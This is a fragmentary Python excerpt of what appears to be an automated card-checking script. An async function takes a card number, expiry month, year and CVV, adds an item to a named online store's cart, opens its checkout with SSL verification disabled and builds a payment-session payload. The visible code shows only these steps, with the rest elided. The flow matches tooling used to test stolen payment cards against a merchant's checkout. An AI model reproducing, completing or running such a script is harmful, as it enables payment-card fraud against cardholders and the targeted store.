...
async def auto_sho_async(cc, mes, ano, cvv):
    ...
    async with aiohttp.ClientSession(connector=conn) as session:
        ...
        req1 = await session.post(url=f"https://wildflowersex.com/cart/add.js", data=payload_1, ssl=False, timeout=aiohttp.ClientTimeout(total=5))

        req3 = await session.get(url=f"https://wildflowersex.com/checkout", ssl=False, timeout=aiohttp.ClientTimeout(total=5))
        ...
        payload_4 = {
            ...
            "payment_session_scope": "wildflowersex.com"
        }
